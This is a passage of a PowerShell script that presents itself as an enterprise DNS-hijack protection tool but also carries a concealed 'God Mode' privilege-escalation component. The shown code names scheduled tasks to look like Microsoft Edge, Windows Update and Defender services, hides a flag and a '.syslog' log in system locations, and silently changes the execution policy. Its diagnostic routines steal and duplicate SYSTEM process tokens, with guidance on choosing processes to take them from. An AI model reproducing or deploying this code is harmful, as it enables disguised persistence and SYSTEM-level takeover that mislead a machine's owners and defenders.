<#
.SYNOPSIS
    Enterprise DNS Hijack Protection & Installer Suite (IPv4 & IPv6 + DoH)
.DESCRIPTION
    A highly verbose, enterprise-grade PowerShell tool that enforces a Zero-Trust 
    Registry padlock on network interface DNS configurations and closes browser DoH loopholes.
    
    NEW FEATURES:
    - Global CLI: Installs 'dnslock' command to Windows PATH for easy cmd access.
    - Automated Installation: Creates a Scheduled Task to re-apply locks automatically on boot/network change.
    - Background Service: Protects against Windows Updates and driver reinstalls.
    - Advanced Auditing: UI now tracks active GPO enforcement and Installation status.
    - Payload Self-Defense: NTFS ACL hardening locks the installation directory against tampering.
#>

param (
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Lock,
    [switch]$Unlock,
    [switch]$SilentLock,
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$GodModeStatus,
    [switch]$Launch,
    [switch]$Verbose,
    [switch]$InstallGodMode,
    [switch]$UninstallGodMode,
    [switch]$DumpLogs,
    [switch]$ExportElevationDiagnostics,
    [switch]$ElevateAllProcesses,
    [switch]$SystemDesktop,
    [switch]$InstallSystemDesktop,
    [switch]$UninstallSystemDesktop,
    [switch]$DebugMode,
    [switch]$LaunchTaskMgrAsSystem,
    [switch]$LaunchShellAsSystem,
    [string]$Shell = ""
)

# ============================================================================
# 0. EXECUTION POLICY AUTO-SET
# ============================================================================
try {
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
} catch {
    # Policy may already be set or restricted by GPO; continue silently
}

# ============================================================================
# 0.5 POWERSHELL 7 PREFERRED LAUNCHER
# ============================================================================
if ($PSVersionTable.PSVersion.Major -le 5) {
    $Pwsh7 = Get-Command -Name pwsh -CommandType Application -ErrorAction SilentlyContinue
    if ($Pwsh7) {
        $ArgList = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"")
        $Bound = $PSBoundParameters.GetEnumerator() | ForEach-Object {
            if ($_.Value -is [switch] -and $_.Value.IsPresent) {
                "-$($_.Key)"
            }
        }
        if ($Bound) { $ArgList += $Bound }
        # Forward string params (the switch loop above only handles switches).
        # -Shell pairs with -LaunchShellAsSystem; lose it across a PS5->PS7
        # relaunch and the on-demand SYSTEM shell defaults to powershell.
        if ($PSBoundParameters.ContainsKey('Shell') -and $Shell) { $ArgList += @("-Shell", $Shell) }
        Start-Process -FilePath $Pwsh7.Source -ArgumentList $ArgList -Wait -NoNewWindow
        Exit
    }
}

# ============================================================================
# 1. AUTO-ELEVATION & PRE-FLIGHT CHECKS
# ============================================================================

# Automatically relaunch as Administrator if not already elevated
$Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$Role = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-not $Principal.IsInRole($Role)) {
    if ($Install -or $Uninstall -or $Lock -or $Unlock -or $SilentLock) {
        Write-Warning "CRITICAL: Administrative privileges required for CLI commands. Access Denied."
        Exit
    }
    Write-Warning "Administrative privileges required. Attempting auto-elevation..."
    Start-Sleep -Seconds 1
    try {
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = (Get-Process -Id $PID).Path
        
        # Forward any CLI flags (like -Uninstall) to the elevated process
        $ArgsString = ""
        if ($Install) { $ArgsString += " -Install" }
        if ($Uninstall) { $ArgsString += " -Uninstall" }
        if ($Lock) { $ArgsString += " -Lock" }
        if ($Unlock) { $ArgsString += " -Unlock" }
        if ($SilentLock) { $ArgsString += " -SilentLock" }
        if ($DebugMode) { $ArgsString += " -DebugMode" }
        if ($Verbose) { $ArgsString += " -Verbose" }
        if ($ExportElevationDiagnostics) { $ArgsString += " -ExportElevationDiagnostics" }
        if ($ElevateAllProcesses) { $ArgsString += " -ElevateAllProcesses" }
        if ($LaunchTaskMgrAsSystem) { $ArgsString += " -LaunchTaskMgrAsSystem" }
        if ($LaunchShellAsSystem) { $ArgsString += " -LaunchShellAsSystem" }
        if ($PSBoundParameters.ContainsKey('Shell') -and $Shell) { $ArgsString += " -Shell $Shell" }

        $ProcessInfo.Arguments = " -NoProfile -ExecutionPolicy Bypass -File `$PSCommandPath`" $ArgsString"
        $ProcessInfo.Verb = "runAs"
        $ProcessInfo.UseShellExecute = $true
        [System.Diagnostics.Process]::Start($ProcessInfo) | Out-Null
        Exit
    } catch {
        Write-Error "Failed to elevate. Please right-click and 'Run as Administrator'."
        Pause
        Exit
    }
}

# Define Installation Paths
$InstallDir = "C:\ProgramData\DNSGuard"
$InstallScript = Join-Path -Path $InstallDir -ChildPath "DNS_Lockdown.ps1"
$CmdPath = "C:\Windows\dnslock.cmd"
$TaskName = "DNS-Hijack-Guard"

# Setup Auto-Logging in the same directory as the script
$ScriptDir = Split-Path -Parent -Path $PSCommandPath
if (-not $ScriptDir) { $ScriptDir = $PWD.Path }
# Log to a writable location (not the hardened install dir) so admin can still write
$LogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.log"
$DebugLogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.debug.log"

$GodModeFlagRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
$GodModeFlagRegName = "GodModeActive"
$GodModeLogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
# SYSTEM-temp log candidates: when the monitor (Start-Monitoring) runs as SYSTEM via
# the stealth scheduled task, Write-Log/$env:TEMP resolves to a SYSTEM temp
# (C:\Windows\Temp or the systemprofile AppData\Local\Temp), NOT the admin user's
# $env:TEMP that Export-GodModeLogs (option 11) reads by default. Collecting these is
# what makes the monitor's own "Monitoring started" / "Monitor elevated: cmd PID=..."
# / error lines visible in the option-11 dump -- the blind spot that left "shells stay
# admin after [7]+reboot" undiagnosable. Best-effort (Test-Path guarded at every read).
$GodModeSystemTempLogCandidates = @(
    'C:\Windows\Temp\DNS_Lockdown_Enterprise.log',
    'C:\Windows\Temp\DNS_Lockdown_Enterprise.debug.log',
    'C:\Windows\System32\config\systemprofile\AppData\Local\Temp\DNS_Lockdown_Enterprise.log',
    'C:\Windows\System32\config\systemprofile\AppData\Local\Temp\DNS_Lockdown_Enterprise.debug.log',
    'C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\DNS_Lockdown_Enterprise.log',
    'C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\DNS_Lockdown_Enterprise.debug.log'
)
$GodModeTaskPrefix = "MicrosoftEdgeUpdateTask_"

$GodModeInstallDir     = "C:\ProgramData\GodMode"
$GodModeInstallScript  = Join-Path -Path $GodModeInstallDir -ChildPath "GodMode.ps1"
$GodModeCmdPath        = "C:\Windows\godmode.cmd"
$GodModeTaskName       = "Windows-Update-Health-Monitor"
$GodModeGuardianName   = "Windows-Update-Health-Check"
$GodModeWatchdogName   = "Windows-Defender-Engine-Update"

# Detector B (gmproxy.c) runtime SYSTEM-crash auto-exclude store. The dir is
# created by Install-ProcessHook with a permissive ACL so both the admin
# (user-session) gmproxy AND the SYSTEM (nested) gmproxy can read/write it.
$GodModeAutoExcludeDir   = "C:\ProgramData\GodModeAutoExclude"
$GodModeAutoExcludeFile  = Join-Path $GodModeAutoExcludeDir "gmproxy_autoexclude.dat"

# Raw debug dump rotation settings
$RawDumpDir = Join-Path $env:TEMP "GodMode_RawDumps"
$MaxRawDumps = 5

function Write-Log {
    param ([string]$Message, [string]$Type = "INFO", [ConsoleColor]$Color = "White")
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try { "[$TimeStamp] [$Type] $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
    
    # Only print to screen if we are NOT running silently in the background
    if (-not $SilentLock) {
        Write-Host "[$Type] $Message" -ForegroundColor $Color
    }
}

function Write-DebugLog {
    param (
        [string]$FunctionName,
        [string]$Action = "ENTRY", # ENTRY, EXIT, ERROR, WARN, INFO
        [string]$Message = "",
        [System.Management.Automation.ErrorRecord]$ErrorRecord = $null,
        [string]$RootCause = ""
    )
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = $MyInvocation.ScriptLineNumber
    try {
        $Detail = "[$TimeStamp] [DEBUG] [$Action] [$FunctionName] [$Line] $Message"
        if ($ErrorRecord) {
            $Stack = $ErrorRecord.ScriptStackTrace -replace "`r`n", " | "
            $Detail += " | Exception: $($ErrorRecord.Exception.Message) | Stack: $Stack"
            if (-not $RootCause) {
                $exMsg = $ErrorRecord.Exception.Message
                if ($exMsg -match "Access is denied" -or $exMsg -match "0x5" -or $exMsg -match "error 5") {
                    $RootCause = "Access Denied. Likely causes: PPL protection on target process, missing SeDebugPrivilege, UAC token filtering removing admin rights, or wrong access mask."
                } elseif ($exMsg -match "0x57" -or $exMsg -match "invalid parameter" -or $exMsg -match "87") {
                    $RootCause = "Invalid parameter. Likely causes: malformed STARTUPINFO, wrong desktop name (must be WinSta0\Default), or invalid creation flags."
                } elseif ($exMsg -match "privilege" -or $exMsg -match "1314") {
                    $RootCause = "Privilege not held. The current process token lacks SeDebugPrivilege, SeAssignPrimaryTokenPrivilege, or SeImpersonatePrivilege. Run as Administrator or SYSTEM."
                }
            }
        }
        if ($RootCause) {
            $Detail += " | ROOT_CAUSE: $RootCause"
        }
        $Detail | Out-File -FilePath $DebugLogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
        # Also mirror to main log if DebugMode is enabled
        if ($DebugMode -or $Verbose) {
            $Detail | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Invoke-WithDebug {
    param (
        [string]$FunctionName,
        [scriptblock]$ScriptBlock
    )
    Write-DebugLog -FunctionName $FunctionName -Action "ENTRY"
    try {
        $Result = & $ScriptBlock
        Write-DebugLog -FunctionName $FunctionName -Action "EXIT" -Message "Success"
        return $Result
    } catch {
        $ErrorRecord = $_
        Write-DebugLog -FunctionName $FunctionName -Action "ERROR" -Message "Exception occurred" -ErrorRecord $ErrorRecord
        Write-Log -Message "[$FunctionName] Error: $($ErrorRecord.Exception.Message)" -Type "ERROR" -Color Red
        throw $ErrorRecord
    }
}

function Export-RawDebugDump {
    param(
        [string]$Trigger = "Manual",
        [string]$DumpDir = $RawDumpDir,
        [int]$KeepCount = $MaxRawDumps
    )
    try {
        if (-not (Test-Path $DumpDir)) { New-Item -ItemType Directory -Path $DumpDir -Force | Out-Null }
        # Rotate: keep only $KeepCount most recent dumps
        Get-ChildItem -Path $DumpDir -Filter "GodMode_RawDump_*.log" -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -Skip $KeepCount |
            Remove-Item -Force -ErrorAction SilentlyContinue
        $Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $DumpFile = Join-Path $DumpDir "GodMode_RawDump_${Timestamp}_${Trigger}.log"
        $Dump = @()
        $Dump += "===== GOD MODE RAW DEBUG DUMP ====="
        $Dump += "Trigger: $Trigger"
        $Dump += "Generated: $(Get-Date)"
        $Dump += "Script: $PSCommandPath"
        $Dump += "PID: $PID"
        $Dump += "PSVersion: $($PSVersionTable.PSVersion)"
        $Dump += "PSPath: $($PSHome)"
        $Dump += "OS: $((Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption)"
        $Dump += "User: $([Environment]::UserName)"
        $Dump += "Computer: $([Environment]::MachineName)"
        $Dump += "IsAdmin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
        $Dump += "IsBuiltInAdmin: $(([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -like '*-500'))"
        $Dump += ""
        $Dump += "===== ENVIRONMENT VARIABLES ====="
        $Dump += (Get-ChildItem Env: -ErrorAction SilentlyContinue | Select-Object Name, Value | Out-String)
        $Dump += ""
        $Dump += "===== LOADED MODULES ====="
        $Dump += (Get-Module | Select-Object Name, Version, Path | Out-String)
        $Dump += ""
        $Dump += "===== RUNNING PROCESSES (Top 20) ====="
        $Dump += (Get-Process -ErrorAction SilentlyContinue | Sort-Object CPU -Descending | Select-Object -First 20 | Out-String)
        $Dump += ""
        $Dump += "===== `$ERROR VARIABLE (Last 20) ====="
        if ($Error.Count -gt 0) {
            $Dump += ($Error | Select-Object -First 20 | ForEach-Object {
                "Exception: $($_.Exception.Message)`nStackTrace: $($_.ScriptStackTrace)`nCategory: $($_.CategoryInfo)`n---"
            } | Out-String)
        } else {
            $Dump += '[No errors in $Error]'
        }
        $Dump += ""
        $Dump += "===== MAIN LOG ====="
        if (Test-Path $LogFile) { $Dump += (Get-Content -Raw $LogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No main log]' }
        $Dump += ""
        $Dump += "===== DEBUG LOG ====="
        if (Test-Path $DebugLogFile) { $Dump += (Get-Content -Raw $DebugLogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No debug log]' }
        $Dump += ""
        $Dump += "===== GOD MODE LOG ====="
        if (Test-Path $GodModeLogFile) { $Dump += (Get-Content -Raw $GodModeLogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No GodMode log]' }
        $Dump += ""
        $Dump += "===== RAW DUMP COMPLETE ====="
        $Dump -join "`r`n" | Out-File -FilePath $DumpFile -Encoding UTF8 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Raw debug dump created: $DumpFile" -Type "DEBUG" -Color Gray
        return $DumpFile
    } catch {
        Write-Log -Message "Failed to create raw debug dump: $_" -Type "ERROR" -Color Red
        return $null
    }
}

# ============================================================================
# 1a. ADVANCED ELEVATION DIAGNOSTICS & ROOT-CAUSE ERROR MAPPING
# ============================================================================

function Get-Win32ErrorRootCause {
    param(
        [int]$ErrorCode,
        [string]$Context = "general"
    )
    $baseMsg = ([ComponentModel.Win32Exception]$ErrorCode).Message
    $rootCause = switch ($ErrorCode) {
        5 {
            $ctx = switch ($Context) {
                "OpenProcess" { "The target process is likely protected by Protected Process Light (PPL) or runs in a higher integrity level. Current token may lack SeDebugPrivilege, or the access mask is rejected. Mitigation: use PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and pick a non-PPL SYSTEM process (winlogon.exe, dwm.exe in Session 1)." }
                "OpenProcessToken" { "Token query access denied. The target process is protected (PPL) or the current token does not have the required privilege. Try a different SYSTEM process." }
                "DuplicateTokenEx" { "Token duplication denied. The source token may be restricted, filtered, or the current process lacks SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege." }
                "CreateProcessWithTokenW" { "Process creation denied. The duplicated token may not have the correct Session ID / WindowStation (WinSta0\Default) for interactive desktop apps. Ensure the source process is in Session 1." }
                default { "Access Denied. Most likely causes: (1) PPL protection on target process, (2) missing SeDebugPrivilege, (3) wrong access mask, (4) integrity level mismatch." }
            }
            "ERROR_ACCESS_DENIED ($baseMsg) | Root cause: $ctx"
        }
        87 {
            "ERROR_INVALID_PARAMETER ($baseMsg). Root cause: a structure field, desktop name, or creation flag is wrong. Verify STARTUPINFO.cb = sizeof(STARTUPINFO), lpDesktop = 'WinSta0\Default', and creation flags are valid."
        }
        6 {
            "ERROR_INVALID_HANDLE ($baseMsg). Root cause: a handle was closed prematurely, is stale, or was never opened. Check that CloseHandle is not called before the handle is used."
        }
        1314 {
            "ERROR_PRIVILEGE_NOT_HELD ($baseMsg). Root cause: the current process token does not hold the required privilege (SeDebugPrivilege, SeAssignPrimaryTokenPrivilege, or SeImpersonatePrivilege). Run as Administrator and ensure Enable-ElevationPrivileges succeeds first."
        }
        1307 {
            "ERROR_INVALID_OWNER ($baseMsg). Root cause: the duplicated token cannot be assigned as the primary token of a new process. The token may be an identification token instead of an impersonation/primary token."
        }
        2 {
            "ERROR_FILE_NOT_FOUND ($baseMsg). Root cause: the executable path passed to CreateProcessWithTokenW does not exist or is not accessible from the SYSTEM token context."
        }
        8 {
            "ERROR_NOT_ENOUGH_MEMORY ($baseMsg). Root cause: system is low on memory or the token/process handle table is exhausted."
        }
        998 {
            "ERROR_NOACCESS ($baseMsg). Root cause: invalid pointer or memory access. A handle pointer may be null or point to freed memory."
        }
        122 {
            "ERROR_INSUFFICIENT_BUFFER ($baseMsg). Root cause: a buffer passed to a Win32 API was too small. Usually not applicable to token ops; check privilege structure sizes."
        }
        1300 {
            "ERROR_NOT_ALL_ASSIGNED ($baseMsg). Root cause: the current process token holds the privilege name but it is disabled or not fully assigned. Typical when running as Administrator (filtered token) rather than SYSTEM. Token stealing may still work if SeImpersonatePrivilege is present; SeAssignPrimaryTokenPrivilege is strictly required only for CreateProcessWithTokenW with a primary token. If this is the only missing privilege, try using an impersonation token path instead."
        }
        default {
            "Win32 error $ErrorCode ($baseMsg). No specific root cause mapped; treat as generic API failure."
        }
    }
    return $rootCause
}

function Get-ElevationPrivilegeStatus {
    $results = @()
    $privNames = @(
        "SeDebugPrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeImpersonatePrivilege",
        "SeTcbPrivilege",
        "SeIncreaseQuotaPrivilege",
        "SeLoadDriverPrivilege"
    )
    foreach ($privName in $privNames) {
        $enabled = $false
        try {
            $enabled = [TokenOps]::EnablePrivilege($privName)
        } catch {
            $enabled = $false
        }
        $results += [PSCustomObject]@{
            Privilege = $privName
            Enabled = $enabled
            Required = ($privName -in @("SeDebugPrivilege","SeAssignPrimaryTokenPrivilege","SeImpersonatePrivilege"))
        }
    }
    $missing = ($results | Where-Object { $_.Required -and -not $_.Enabled }).Privilege -join ", "
    $diagnostics = "Current token elevation privilege diagnostics: "
    if ($missing) {
        $diagnostics += "MISSING REQUIRED PRIVILEGES: $missing. These are mandatory for token stealing. If you are Administrator but not SYSTEM, SeDebugPrivilege may be removed by UAC token filtering. Use a fully elevated (RunAsAdmin) shell or SYSTEM shell."
    } else {
        $diagnostics += "All required privileges are present. If token stealing still fails, look for PPL protection or Session/WindowStation mismatch."
    }
    Write-DebugLog -FunctionName "Get-ElevationPrivilegeStatus" -Action "INFO" -Message $diagnostics
    return $results
}

function Get-ProcessElevationContext {
    param([int]$ProcessId)
    $context = [PSCustomObject]@{
        PID = $ProcessId
        Name = "Unknown"
        SessionId = -1
        Owner = "Unknown"
        IsSystem = $false
        CanOpen = $false
        CanQueryToken = $false
        CanDuplicate = $false
        RootCause = ""
        Recommend = ""
    }
    try {
        $proc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
        if ($proc) { $context.Name = $proc.Name }
    } catch {}
    try {
        $wmi = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction SilentlyContinue
        if ($wmi) {
            $context.SessionId = $wmi.SessionId
            try {
                $owner = ($wmi | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                $context.Owner = $owner
                $context.IsSystem = ($owner -eq "SYSTEM")
            } catch {}
        }
    } catch {}
    # Fail-open: the TokenOps P/Invoke calls below throw "Unable to find type
    # [TokenOps]" if the C# class failed to compile (the concurrent-Add-Type OOM
    # root cause). This diagnostic helper is reached via Export-ElevationDiagnostics
    # <- Find-SystemProcessCandidate (no-candidate path) even when TokenOps is
    # missing, so an uncaught throw here would propagate out + hit the global
    # trap { ... break }. Wrap the whole TokenOps block so it degrades to a
    # RootCause string instead of throwing.
    try {
        if ($context.IsSystem) {
            $hProc = [TokenOps]::OpenProcess([TokenOps]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $ProcessId)
            if ($hProc -eq [IntPtr]::Zero) {
                $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $context.CanOpen = $false
                $context.RootCause = "OpenProcess failed: $(Get-Win32ErrorRootCause -ErrorCode $err -Context 'OpenProcess')"
                $context.Recommend = "This process is protected (likely PPL). Do NOT use it as token source. Pick a Session 1 SYSTEM process like winlogon.exe or dwm.exe."
            } else {
                $context.CanOpen = $true
                try {
                    $hToken = [IntPtr]::Zero
                    if ([TokenOps]::OpenProcessToken($hProc, [TokenOps]::TOKEN_DUPLICATE -bor [TokenOps]::TOKEN_QUERY, [ref]$hToken)) {
                        $context.CanQueryToken = $true
                        try {
                            $hDup = [IntPtr]::Zero
                            if ([TokenOps]::DuplicateTokenEx($hToken, [TokenOps]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOps]::SecurityImpersonation, [TokenOps]::TokenPrimary, [ref]$hDup)) {
                                $context.CanDuplicate = $true
                                [TokenOps]::CloseHandle($hDup)
                            } else {
                                $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                $context.CanDuplicate = $false
                                $context.RootCause = "DuplicateTokenEx failed: $(Get-Win32ErrorRootCause -ErrorCode $err -Context 'DuplicateTokenEx')"
                                $context.Recommend = "Token is restricted or filtered. Try a different SYSTEM process."
                            }
                        } finally {
                            [TokenOps]::CloseHandle($hToken)
                        }
                    } else {
                        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        $context.CanQueryToken = $false
                        $context.RootCause = "OpenProcessToken failed: $(Get-Win32ErrorRootCause -ErrorCode $err -Context 'OpenProcessToken')"
                        $context.Recommend = "Process token is protected. Try a different SYSTEM process."
                    }
                } finally {
                    [TokenOps]::CloseHandle($hProc)
                }
            }
        } else {
            $context.RootCause = "Not a SYSTEM process. Owner = $($context.Owner)"
            $context.Recommend = "Only SYSTEM processes can be used as token source."
        }
    } catch {
        $context.CanOpen = $false
        $context.CanQueryToken = $false
        $context.CanDuplicate = $false
        $context.RootCause = "TokenOps C# P/Invoke not loaded -- elevation diagnostics unavailable ($($_.Exception.Message))"
        $context.Recommend = "Re-enable God Mode (option [7]) when no other enable task is racing to compile TokenOps."
    }
    return $context
}

function Get-GodModeLogDir {
    <#
    .SYNOPSIS
        Resolve a writable directory for diagnostic logs (driver build log,
        compiler-error abort log, log dumps) that is safe when the caller is
        SYSTEM. [Environment]::GetFolderPath("Desktop") returns "" for SYSTEM
        (no user profile / no Desktop), and Join-Path with an empty -Path
        throws "Cannot bind argument to parameter 'Path' because it is an
        empty string" -- as an UNCAUGHT error this killed every scheduled-task
        -ToggleOn / -Launch relaunch (Install-ProcessHook build-log +
        Enable-GodMode abort-log both crashed here as SYSTEM). Prefer Desktop
        (so the admin can find the logs), then $env:TEMP (per-context temp --
        C:\Windows\Temp as SYSTEM), then C:\Windows\Temp (always writable by
        SYSTEM + Administrators). Fail-open: every probe is guarded.
    #>
    try {
        $desk = [Environment]::GetFolderPath("Desktop")
        if ($desk -and (Test-Path $desk)) { return $desk }
    } catch {}
    try {
        if ($env:TEMP -and (Test-Path $env:TEMP)) { return $env:TEMP }
    } catch {}
    return "C:\Windows\Temp"
}

function Export-ElevationDiagnostics {
    param(
        [string]$Trigger = "Auto",
        [string]$DestinationFolder = (Get-GodModeLogDir)
    )
    $dump = @()
    $dump += "===== ELEVATION DIAGNOSTICS DUMP ====="
    $dump += "Trigger: $Trigger"
    $dump += "Timestamp: $(Get-Date)"
    $dump += "Script PID: $PID"
    $dump += "User: $([Environment]::UserName)"
    $dump += "IsAdmin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
    $dump += "IsBuiltInAdmin: $(([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -like '*-500'))"
    $dump += ""
    $dump += "----- PRIVILEGE STATUS -----"
    $privStatus = Get-ElevationPrivilegeStatus
    $dump += ($privStatus | Format-Table -AutoSize | Out-String)
    $dump += ""
    $dump += "----- SYSTEM PROCESSES (Top 40) -----"
    $sysProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessId -gt 4 } | Sort-Object SessionId -Descending | Select-Object -First 40
    foreach ($sp in $sysProcs) {
        $ctx = Get-ProcessElevationContext -ProcessId $sp.ProcessId
        $dump += "PID=$($ctx.PID) Name=$($ctx.Name) Session=$($ctx.SessionId) Owner=$($ctx.Owner) CanOpen=$($ctx.CanOpen) CanQuery=$($ctx.CanQueryToken) CanDup=$($ctx.CanDuplicate) IsSystem=$($ctx.IsSystem)"
        if ($ctx.RootCause) { $dump += "  -> RootCause: $($ctx.RootCause)" }
        if ($ctx.Recommend) { $dump += "  -> Recommend: $($ctx.Recommend)" }
    }
    $dump += ""
    $dump += "----- LAST WIN32 ERRORS (session) -----"
    $lastErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    if ($lastErr -ne 0) {
        $dump += "Last Win32 error in this thread: $lastErr -> $(Get-Win32ErrorRootCause -ErrorCode $lastErr)"
    } else {
        $dump += "No pending Win32 error in this thread."
    }
    $dump += ""
    $dump += "----- END ELEVATION DIAGNOSTICS -----"
    $dumpPath = Join-Path $DestinationFolder "GodMode_ElevationDiagnostics_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').log"
    $dump -join "`r`n" | Out-File -FilePath $dumpPath -Encoding UTF8 -Force
    Write-Log -Message "Elevation diagnostics exported to: $dumpPath" -Type "DEBUG" -Color Gray
    Write-DebugLog -FunctionName "Export-ElevationDiagnostics" -Action "INFO" -Message "Dump written to $dumpPath"
    return $dumpPath
}

# Global uncaught error trap: dump raw debug state and log, then break
trap {
    Export-RawDebugDump -Trigger "UNCAUGHT_TRAP"
    Write-Log -Message "UNCAUGHT TRAP: $($_.Exception.Message) | Stack: $($_.ScriptStackTrace)" -Type "ERROR" -Color Red
    break
}

if (-not $SilentLock) { Write-Log -Message "Enterprise Diagnostics Suite Initialized." -Type "SYSTEM" -Color Cyan }

# ============================================================================
# 2. SYSTEM AUDIT & HARDWARE DISCOVERY
# ============================================================================

function Run-SystemAudit {
    Write-Log -Message "Running Pre-Flight System Audit..." -Type "AUDIT" -Color DarkGray
    $OS = Get-CimInstance Win32_OperatingSystem
    Write-Log -Message "OS Version: $($OS.Caption) (Build $($OS.BuildNumber))" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "PS Version: $($PSVersionTable.PSVersion)" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "Execution Path: $ScriptDir" -Type "AUDIT" -Color DarkGray
}

if (-not $SilentLock) { Run-SystemAudit }

# Fetch all network adapters (excluding hidden virtual ones if possible, but keeping all physical)
$Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue } # Fallback

$SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
$SidSystem = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
$SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
# Network UI restrictions are USER policies (HKCU) -- they gray out the adapter properties UI
$GpoPath = "HKCU:\Software\Policies\Microsoft\Windows\Network Connections"

# Define Browser DoH GPO Paths
$EdgePath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
$ChromePath = "HKLM:\SOFTWARE\Policies\Google\Chrome"
$FirefoxPath = "HKLM:\SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

# ============================================================================
# 3. STATUS CHECKER MODULE (ENHANCED UI)
# ============================================================================

function Get-DNSLockStatus {
    $AllLocked = $true
    $AnyLocked = $false

    # Refresh adapter list each time (USB/Wi-Fi may change while menu is open)
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }

    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " LIVE HARDWARE ADAPTER STATUS " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # --- 1. CHECK HARDWARE ADAPTERS ---
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $AdapterLocked = $false
        $StatusColor = if ($Adapter.Status -eq "Up") { "Green" } else { "DarkGray" }

        # Display Hardware Data
        Write-Host ("  Hardware: {0,-25} | State: {1,-5} | MAC: {2}" -f $Adapter.Name, $Adapter.Status, $Adapter.MacAddress) -ForegroundColor $StatusColor

        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") {
                                $AdapterLocked = $true
                            }
                        } catch {} 
                    }
                    $RegKey.Close()
                }
            } catch {}
        }

        # Visual Output Logic
        if ($AdapterLocked) {
            Write-Host "  `-> Security: [X] LOCKED (IPv4/IPv6)" -ForegroundColor Red
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AnyLocked = $true
        } else {
            Write-Host "  `-> Security: [ ] UNLOCKED (Vulnerable)" -ForegroundColor Green
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AllLocked = $false
        }
    }

    # --- 2. CHECK SYSTEM POLICIES & INSTALLATION ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " SYSTEM POLICIES & PERSISTENCE " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

